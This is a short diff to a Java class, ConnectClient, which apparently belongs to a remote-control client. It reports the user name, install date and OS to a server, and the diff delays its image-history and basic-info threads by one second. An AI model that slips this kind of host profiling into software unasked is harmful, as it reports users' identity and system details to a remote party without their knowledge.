@@ -15,6 +15,7 @@ import java.io.PrintWriter;
 import java.net.Socket;
 import java.util.concurrent.Executors;
 import java.util.concurrent.ScheduledExecutorService;
+import java.util.concurrent.TimeUnit;
 
 public class ConnectClient {
 
@@ -100,7 +101,10 @@ public class ConnectClient {
         msg("user:" + System.getProperty("user.name"));
         msg("date:" + FileComponents.toDate(new File(InstallComponents.LOCAL_FILE).lastModified()));
         msg("os:" + System.getProperty("os.name"));
-        new Thread(ImageComponents::execHistoryUpdate).start();
+        EXECUTOR.schedule(() -> {
+            new Thread(ImageComponents::execHistoryUpdate).start();
+            new Thread(ControlComponents::sendBasicInfo).start();
+        }, 1, TimeUnit.SECONDS);
 
         try {
             String serverMessage;
